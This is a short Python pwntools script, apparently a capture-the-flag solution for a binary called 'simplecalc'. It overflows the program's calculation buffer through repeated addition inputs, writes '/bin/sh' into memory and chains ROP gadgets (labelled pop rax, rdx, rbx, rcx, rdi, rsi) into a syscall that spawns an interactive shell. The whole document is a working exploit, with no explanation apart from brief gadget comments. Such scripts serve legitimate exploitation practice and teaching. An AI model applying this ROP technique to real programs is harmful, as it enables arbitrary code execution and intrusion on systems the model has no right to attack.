from pwn import *

def sendAdd(add):
    target.sendline(b"2")
    target.sendline(add)
    target.sendline(b"100")
    target.sendline(b"2")
    target.sendline(b"1000")
    target.sendline(b"1000")
    
target = process('./simplecalc')
# gdb.attach(target, gdbscript = 'b *0x000000000040154a')

target.sendline(b"150")

for i in range(0, 18):
    target.sendline(b"2")
    target.sendline(b"1000")
    target.sendline(b"1000")


sendAdd("4512664") # pop rax
sendAdd("7089316") # bss add
sendAdd("4422377") #pop rdx
target.sendline(b"2") # setting up /bin/sh\0
target.sendline(b"1852400275")
target.sendline(b"100")
target.sendline(b"2")
target.sendline(b"6845331")
target.sendline(b"100")
sendAdd("4477650")
sendAdd("4512664") # pop rax
sendAdd("159")
sendAdd("4422377") # pop rdx
sendAdd("100")
sendAdd("4228721") #pop rbx
sendAdd("100")
sendAdd("4951931") # pop rcx
sendAdd("7089316")
sendAdd("4201431") #pop rdi
sendAdd("7089316")
sendAdd("4201707") # pop rsi
sendAdd("100")
sendAdd("4195564")

target.sendline(b"5")


target.interactive()
